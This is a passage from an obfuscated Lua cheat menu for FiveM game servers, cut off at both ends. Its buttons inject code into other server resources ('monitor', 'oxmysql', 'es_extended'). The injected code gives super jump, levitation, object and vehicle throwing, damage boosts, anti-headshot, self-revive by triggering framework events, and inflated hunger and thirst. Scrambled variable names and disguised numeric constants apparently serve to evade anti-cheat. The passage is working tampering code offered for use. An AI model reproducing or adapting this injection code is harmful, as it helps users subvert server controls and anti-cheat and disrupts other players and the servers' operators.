                                    function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                                }
                                local randomAction = actions[math.random(#actions)]
                                randomAction(targetEntity)
                            end
                        end
                    end
                end

                -- Main Camera Movement Thread (Unchanged)
                local function cameraThread()
                    local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                    while isFreecamActive do
                        Wait(0)
                        local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
                        local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                        if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                        local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                        SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                        local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                    end
                end
                
                startFreecam = function()
                    if isFreecamActive then return end
                    isFreecamActive = true
                    local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                    freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                    
                    if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                    RenderScriptCams(true, false, 0, true, true)
                    SetCamActive(freecamHandle, true)
                    CreateThread(drawThread)
                    CreateThread(logicThread)
                    CreateThread(cameraThread)
                end

                stopFreecam = function()
                    if not isFreecamActive then return end
                    isFreecamActive = false
                    if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                    Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                    freecamHandle = nil
                end
                
                CreateThread(function()
                    while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                        if IsDisabledControlJustPressed(0, 74) then -- H key
                            if isFreecamActive then stopFreecam()
                            else startFreecam() end
                        end
                    end
                end)
            end
            
            initializeFreecam()
        ]]);end,function() MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            g_FreecamFeatureEnabled = false
            if isFreecamActive and stopFreecam then stopFreecam() end
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Super Jump",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
            xCvBnMqWeRtYuIo = true

            local function JcWT5vYEq1()
                local yLkPwOiUtReAzXc = CreateThread
                yLkPwOiUtReAzXc(function()
                    while xCvBnMqWeRtYuIo and not Unloaded do
                        local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                        local eRtYuIoPaSdFgHj = PlayerPedId()
                        local oPlMnBvCxZlKjHg = PlayerId()

                        hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                        Wait(0)
                    end
                end)
            end

            JcWT5vYEq1()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            xCvBnMqWeRtYuIo = false
        ]]);end);MachoMenuCheckbox(v39[3 -2 ],"Levitation",function() local v183=0;while true do if (v183==(0 + 0)) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            -- make helpers global so other chunks can use them
            function ScaleVector(vect, mult)
                return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
            end

            function AddVectors(vect1, vect2)
                return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
            end

            function ApplyForce(entity, direction)
                local XroXTNEFqxoWfH = ApplyForceToEntity
                XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
            end

            function SubVectors(vect1, vect2)
                return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
            end

            function Oscillate(entity, position, angleFreq, dampRatio)
                local OBaTQqteIpmZVo = GetEntityVelocity
                local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
                local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
                local targetPos = SubVectors(pos1, pos2)
                ApplyForce(entity, targetPos)
            end

            function RotationToDirection(rot)
                local radZ = math.rad(rot.z)
                local radX = math.rad(rot.x)
                local cosX = math.cos(radX)
                return vector3(
                    -math.sin(radZ) * cosX,
                    math.cos(radZ) * cosX,
                    math.sin(radX)
                )
            end

            function GetClosestCoordOnLine(startCoords, endCoords, entity)
                local CDGcdMQhosGVCf = GetShapeTestResult
                local UaWIFHgeizhHua = StartShapeTestRay
                local result, hit, hitCoords, surfaceNormal, entityHit =
                    CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
                return hit == 1, hitCoords
            end

            function GetCameraLookingAtCoord(distance)
                local playerPed = PlayerPedId()
                local camRot = GetGameplayCamRot(2)
                local camCoord = GetGameplayCamCoord()
                local forwardVector = RotationToDirection(camRot)
                local destination = vector3(
                    camCoord.x + forwardVector.x * distance,
                    camCoord.y + forwardVector.y * distance,
                    camCoord.z + forwardVector.z * distance
                )
                local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
                if hit then return endCoords else return destination end
            end
        ]]);MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function awfjawr57awt7f()
                nxtBFlQWMMeRLs = true

                local jIiIfikctHYrlH = CreateThread
                jIiIfikctHYrlH(function()
                    while nxtBFlQWMMeRLs and not Unloaded do
                        Wait(0)
                        local ped = PlayerPedId()

                        local SZxuJlyJQmGlZz = SetPedCanRagdoll
                        local valuOZfymjeVaH = IsEntityPlayingAnim
                        local IiHiLVRagMQhrn = RequestAnimDict
                        local mOZOquvggdnbod = HasAnimDictLoaded
                        local UFZdrZNXpLwpjT = TaskPlayAnim
                        local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                        local OyvuuAMyvjtIzD = GetGameplayCamRot
                        local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                        while XKWvPIkCKMXIfR(0, 22) do
                            SZxuJlyJQmGlZz(ped, false)

                            if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                                while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                    Wait(0)
                                end
                                UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                    8.0, -8.0, -1, 49, 0, false, false, false)
                            end

                            local camRot = OyvuuAMyvjtIzD(2)
                            local camHeading = (camRot.z + 360) % 360
                            local direction = cQPIZtKyyWaVcY(77)

                            SetEntityHeading(ped, camHeading)
                            Oscillate(ped, direction, 0.33, 0.9)

                            Wait(1)
                        end

                        if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                            ClearPedTasks(ped)
                        end

                        SZxuJlyJQmGlZz(ped, true)
                    end
                end)
            end

            awfjawr57awt7f()
        ]]);break;end end end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            nxtBFlQWMMeRLs = false
            ClearPedTasks(PlayerPedId())
        ]]);end);MachoMenuCheckbox(v39[471 -(381 + 89) ],"Super Strength",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
            fgawjFmaDjdALaO = true

            local holdingEntity = false
            local holdingCarEntity = false
            local holdingPed = false
            local heldEntity = nil
            local entityType = nil
            local awfhjawrasfs = CreateThread

            awfhjawrasfs(function()
                while fgawjFmaDjdALaO and not Unloaded do
                    Wait(0)
                    if holdingEntity and heldEntity then
                        local playerPed = PlayerPedId()
                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                        
                        if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                            RequestAnimDict('anim@mp_rollarcoaster')
                            while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                        elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                            RequestAnimDict('anim@heists@box_carry@')
                            while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                        end

                        if not IsEntityAttached(heldEntity) then
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            heldEntity = nil
                        end
                    end
                end
            end)

            awfhjawrasfs(function()
                while fgawjFmaDjdALaO and not Unloaded do
                    Wait(0)
                    local playerPed = PlayerPedId()
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                    local validTarget = false

                    if hit == 1 then
                        entityType = GetEntityType(entityHit)
                        if entityType == 3 or entityType == 2 or entityType == 1 then
                            validTarget = true
                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                        end
                    end

                    if IsDisabledControlJustReleased(0, 38) then
                        if validTarget and not holdingEntity then
                            holdingEntity = true
                            heldEntity = entityHit

                            local wfuawruawts = AttachEntityToEntity

                            if entityType == 3 then
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                            elseif entityType == 2 then
                                holdingCarEntity = true
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            elseif entityType == 1 then
                                holdingPed = true
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            end
                        end
                    elseif IsDisabledControlJustReleased(0, 246) then
                        if holdingEntity then
                            local wgfawhtawrs = DetachEntity
                            local dfgjsdfuwer = ApplyForceToEntity
                            local sdgfhjwserw = ClearPedTasks

                            wgfawhtawrs(heldEntity, true, true)
                            dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            heldEntity = nil
                            sdgfhjwserw(PlayerPedId())
                        end
                    end
                end
            end)

            function RotationToDirection(rotation)
                local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                return direction
            end

            function DrawText3Ds(x, y, z, text)
                local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                local px, py, pz = table.unpack(GetGameplayCamCoords())
                local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                local fov = (1 / GetGameplayCamFov()) * 100
                scale = scale * fov

                if onScreen then
                    SetTextScale(0.0 * scale, 0.35 * scale)
                    SetTextFont(0)
                    SetTextProportional(1)
                    SetTextColour(255, 255, 255, 215)
                    SetTextDropshadow(0, 0, 0, 0, 155)
                    SetTextEdge(2, 0, 0, 0, 150)
                    SetTextDropShadow()
                    -- SetTextOutline()
                    SetTextEntry("STRING")
                    SetTextCentre(1)
                    AddTextComponentString(text)
                    DrawText(_x, _y)
                end
            end
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            fgawjFmaDjdALaO = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Super Punch",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
            qWeRtYuIoPlMnBv = true

            local function NdaFBuHkvo()
                local uTrEsAzXcVbNmQw = CreateThread
                uTrEsAzXcVbNmQw(function()
                    while qWeRtYuIoPlMnBv and not Unloaded do
                        local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                        local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                        local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                        local sDfGhJkLqWeRtYu = PlayerId()
                        local DamageRateValue = 150.0
                        local WeaponNameForDamage = "WEAPON_UNARMED"


                        nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                        cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                        bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                        Wait(0)
                    end
                end)
            end

            NdaFBuHkvo()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local qWeRtYuIoPlMnBv = false
            local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
            local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
            local bNmQwErTyUiOpAs = SetWeaponDamageModifier
            local sDfGhJkLqWeRtYu = PlayerId()

            nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
            cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
            bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Throw From Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
            zXpQwErTyUiPlMn = true

            local function qXzRP7ytKW()
                local iLkMzXvBnQwSaTr = CreateThread
                iLkMzXvBnQwSaTr(function()
                    while zXpQwErTyUiPlMn and not Unloaded do
                        local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                        vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                        Wait(0)
                    end
                end)
            end

            qXzRP7ytKW()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXpQwErTyUiPlMn = false
        ]]);end);MachoMenuCheckbox(v39[1],"Force Third Person",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
            kJfGhTrEeWqAsDz = true

            local function pqkTRWZ38y()
                local gKdNqLpYxMiV = CreateThread
                gKdNqLpYxMiV(function()
                    while kJfGhTrEeWqAsDz and not Unloaded do
                        local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                        local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                        qWeRtYuIoPlMnBv(0)
                        aSdFgHjKlQwErTy(0)
                        Wait(0)
                    end
                end)
            end

            pqkTRWZ38y()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            kJfGhTrEeWqAsDz = false
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"Force Driveby",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
            zXcVbNmQwErTyUi = true

            local function UEvLBcXqM6()
                local cVbNmAsDfGhJkLz = CreateThread
                cVbNmAsDfGhJkLz(function()
                    while zXcVbNmQwErTyUi and not Unloaded do
                        local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                        local eRtYuIoPaSdFgHi = PlayerPedId()

                        lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                        Wait(0)
                    end
                end)
            end

            UEvLBcXqM6()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXcVbNmQwErTyUi = false
        ]]);end);MachoMenuCheckbox(v39[1157 -(1074 + 82) ],"Anti-Headshot",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
            yHnvrVNkoOvGMWiS = true

            local eeitKYqDwYbPslTW = CreateThread
            local function LIfbdMbeIAeHTnnx()
                eeitKYqDwYbPslTW(function()
                    while yHnvrVNkoOvGMWiS and not Unloaded do
                        local fhw72q35d8sfj = SetPedSuffersCriticalHits
                        fhw72q35d8sfj(PlayerPedId(), false)
                        Wait(0)
                    end
                end)
            end

            LIfbdMbeIAeHTnnx()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            yHnvrVNkoOvGMWiS = false
            fhw72q35d8sfj(PlayerPedId(), true)
        ]]);end);MachoMenuCheckbox(v39[1 -0 ],"Anti-Freeze",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
            nHgFdSaZxCvBnMq = true

            local sdfw3w3tsdg = CreateThread
            local function XELa6FJtsB()
                sdfw3w3tsdg(function()
                    while nHgFdSaZxCvBnMq and not Unloaded do
                        local fhw72q35d8sfj = FreezeEntityPosition
                        local segfhs347dsgf = ClearPedTasks

                        if IsEntityPositionFrozen(PlayerPedId()) then
                            fhw72q35d8sfj(PlayerPedId(), false)
                            segfhs347dsgf(PlayerPedId())
                        end
                        
                        Wait(0)
                    end
                end)
            end

            XELa6FJtsB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            nHgFdSaZxCvBnMq = false
        ]]);end);MachoMenuCheckbox(v39[1785 -(214 + 1570) ],"Anti-Blackscreen",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
            aDjsfmansdjwAEl = true

            local sdfw3w3tsdg = CreateThread
            local function XELWAEDa6FJtsB()
                sdfw3w3tsdg(function()
                    while aDjsfmansdjwAEl and not Unloaded do
                        DoScreenFadeIn(0)
                        Wait(0)
                    end
                end)
            end

            XELWAEDa6FJtsB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aDjsfmansdjwAEl = false
        ]]);end);local v51=MachoMenuInputbox(v39[2],"Model Name:","...");MachoMenuButton(v39[2],"Change Model",function() local v184=1455 -(990 + 465) ;local v185;while true do if (v184==0) then v185=MachoMenuGetInputbox(v51);if ((type(v185)=="string") and (v185~="")) then local v321=0;local v322;while true do if ((0 + 0)==v321) then v322=string.format([[
                local function GykR8qjWTp()
                    local nHgFdSaZxCvBnMq = RequestModel
                    local xCvBnMqWeRtYuIo = HasModelLoaded
                    local aSdFgHjKlQwErTy = SetPlayerModel
                    local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                    nHgFdSaZxCvBnMq(GetHashKey("%s"))
                    while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                        Wait(1)
                    end
                    
                    aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                    oPlMnBvCxZlKjHg(PlayerPedId())
                end

                GykR8qjWTp()
            ]],v185,v185,v185);MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,v322);break;end end end break;end end end);MachoMenuButton(v39[2],"White Thug Drip",function() local v186=0 + 0 ;while true do if (v186==0) then function WhiteThugDrip() local v313=0 + 0 ;local v314;while true do if (v313==(7 -5)) then SetPedComponentVariation(v314,1730 -(1668 + 58) ,56,626 -(512 + 114) ,2);SetPedComponentVariation(v314,15 -9 ,38 -19 ,0 -0 ,1 + 1 );v313=1 + 2 ;end if (1==v313) then SetPedComponentVariation(v314,8,15,0 + 0 ,2);SetPedComponentVariation(v314,3,16 -11 ,1994 -(109 + 1885) ,1471 -(1269 + 200) );v313=2;end if ((0 -0)==v313) then v314=PlayerPedId();SetPedComponentVariation(v314,826 -(98 + 717) ,109,0,2);v313=827 -(802 + 24) ;end if (v313==(5 -2)) then SetPedPropIndex(v314,0 -0 ,1 + 0 ,0 + 0 ,true);break;end end end WhiteThugDrip();break;end end end);MachoMenuButton(v39[1 + 1 ],"JTG Mafia Drip",function() local v187=0 + 0 ;while true do if (v187==0) then function JTGMafia() local v315=0;local v316;while true do if ((2 -1)==v315) then SetPedComponentVariation(v316,26 -18 ,6 + 9 ,0 + 0 ,2);SetPedComponentVariation(v316,3 + 0 ,4 + 1 ,0 + 0 ,1435 -(797 + 636) );v315=9 -7 ;end if (v315==3) then SetPedPropIndex(v316,1619 -(1427 + 192) ,10 + 16 ,0 -0 ,true);SetPedPropIndex(v316,1,3 + 0 ,0,true);break;end if (v315==0) then v316=PlayerPedId();SetPedComponentVariation(v316,5 + 6 ,331 -(192 + 134) ,1276 -(316 + 960) ,2 + 0 );v315=1;end if (v315==(2 + 0)) then SetPedComponentVariation(v316,4 + 0 ,42,0 -0 ,553 -(83 + 468) );SetPedComponentVariation(v316,1812 -(1202 + 604) ,27 -21 ,0,2 -0 );v315=8 -5 ;end end end JTGMafia();break;end end end);MachoMenuButton(v39[328 -(45 + 280) ],"Heal",function() SetEntityHealth(PlayerPedId(),194 + 6 );end);MachoMenuButton(v39[3 + 0 ],"Armor",function() SetPedArmour(PlayerPedId(),100);end);MachoMenuButton(v39[3],"Fill Hunger",function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function DawrjatjsfAW()
                TriggerEvent('esx_status:set', 'hunger', 1000000)
            end

            DawrjatjsfAW()
        ]]);end);MachoMenuButton(v39[2 + 1 ],"Fill Thirst",function() MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function sWj238fsMAw()
                TriggerEvent('esx_status:set', 'thirst', 1000000)
            end

            sWj238fsMAw()
        ]]);end);MachoMenuButton(v39[5 -2 ],"Revive",function() MachoInjectResource2(3,(v48("ox_inventory") and "ox_inventory") or (v48("ox_lib") and "ox_lib") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("wasabi_ambulance") and "wasabi_ambulance") or (v48("ak47_ambulancejob") and "ak47_ambulancejob") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function AcjU5NQzKw()
                if GetResourceState('prp-injuries') == 'started' then
                    TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                    return
                end

                if GetResourceState('es_extended') == 'started' then
                    TriggerEvent("esx_ambulancejob:revive")
                    return
                end

                if GetResourceState('qb-core') == 'started' then
                    TriggerEvent("hospital:client:Revive")
                    return
                end

                if GetResourceState('wasabi_ambulance') == 'started' then
                    TriggerEvent("wasabi_ambulance:revive")
                    return
                end

                if GetResourceState('ak47_ambulancejob') == 'started' then
                    TriggerEvent("ak47_ambulancejob:revive")
                    return
                end

                NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
                BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

                RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
                RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
            end

            AcjU5NQzKw()
        ]]);end);MachoMenuButton(v39[1914 -(340 + 1571) ],"Suicide",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function RGybF0JqEt()
                local aSdFgHjKlQwErTy = SetEntityHealth
                aSdFgHjKlQwErTy(PlayerPedId(), 0)
            end

            RGybF0JqEt()
        ]]);end);MachoMenuButton(v39[3],"Force Ragdoll",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function awfAEDSADWEf()
                local cWAmdjakwDksFD = SetPedToRagdoll
                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
            end

            awfAEDSADWEf()
        ]]);end);MachoMenuButton(v39[3],"Clear Task",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function iPfT7kN3dU()
                local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
                zXcVbNmAsDfGhJk(PlayerPedId())
            end

            iPfT7kN3dU()
        ]]);end);MachoMenuButton(v39[2 + 1 ],"Clear Vision",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function MsVqZ29ptY()
                local qWeRtYuIoPlMnBv = ClearTimecycleModifier
                local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

                qWeRtYuIoPlMnBv()
                kJfGhTrEeWqAsDz()
            end

            MsVqZ29ptY()
        ]]);end);MachoMenuButton(v39[1775 -(1733 + 39) ],"Randomize Outfit",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function UxrKYLp378()
                local UwEsDxCfVbGtHy = PlayerPedId
                local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                local QwAzXsEdCrVfBg = SetPedComponentVariation
                local LkJhGfDsAqWeRt = SetPedHeadBlendData
                local MnBgVfCdXsZaQw = SetPedHairColor
                local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                local TyUiOpAsDfGhJk = SetPedHeadOverlay
                local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                local DfGhJkLzXcVbNm = ClearPedProp

                local function PqLoMzNkXjWvRu(component, exclude)
                    local ped = UwEsDxCfVbGtHy()
                    local total = FdSaQwErTyUiOp(ped, component)
                    if total <= 1 then return 0 end
                    local choice = exclude
                    while choice == exclude do
                        choice = math.random(0, total - 1)
                    end
                    return choice
                end

                local function OxVnBmCxZaSqWe(component)
                    local ped = UwEsDxCfVbGtHy()
                    local total = FdSaQwErTyUiOp(ped, component)
                    return total > 1 and math.random(0, total - 1) or 0
                end

                local ped = UwEsDxCfVbGtHy()

                QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                local face = math.random(0, 45)
                local skin = math.random(0, 45)
                LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                local hairMax = FdSaQwErTyUiOp(ped, 2)
                local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                MnBgVfCdXsZaQw(ped, 0, 0)

